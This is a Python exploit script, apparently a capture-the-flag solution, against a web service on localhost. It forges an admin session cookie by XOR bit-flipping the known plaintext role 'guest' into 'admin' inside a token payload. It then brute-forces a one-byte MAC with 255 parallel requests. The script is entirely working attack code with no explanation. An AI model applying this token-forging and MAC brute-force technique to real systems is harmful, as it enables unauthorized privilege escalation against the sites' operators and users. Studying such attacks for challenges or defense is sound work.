import sys
import httpx
from pwn import xor, urldecode, base64
from multiprocessing import Process

URL = "http://localhost"


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)


class API(BaseAPI):
    def cook(s, cookie):
        return s.c.get("/", cookies={"jwt": cookie})


if __name__ == "__main__":
    api = API()
    cookie = httpx.get(URL).cookies.get("jwt")
    header, data, mac = urldecode(cookie).split(".")
    raw_data = base64.b64decode(data)
    # change role to admin by xor it with plain text and xor it again with our desired plain text
    raw_block = xor(raw_data, b'{"role":"guest"}')
    admin_raw_data = xor(raw_block, b'{"role":"admin"}')
    admin_data = base64.b64encode(admin_raw_data).decode()
    def cook(i):
        cookie = f"{header}.{admin_data}.{base64.b64encode(chr(i).encode()).decode()}"
        res = api.cook(cookie)
        if not "TypeError" in res.text:
            print(res.text)
    for i in range(0, 255):
        p = Process(target=cook, args=(i,))
        p.start()
    p.join()
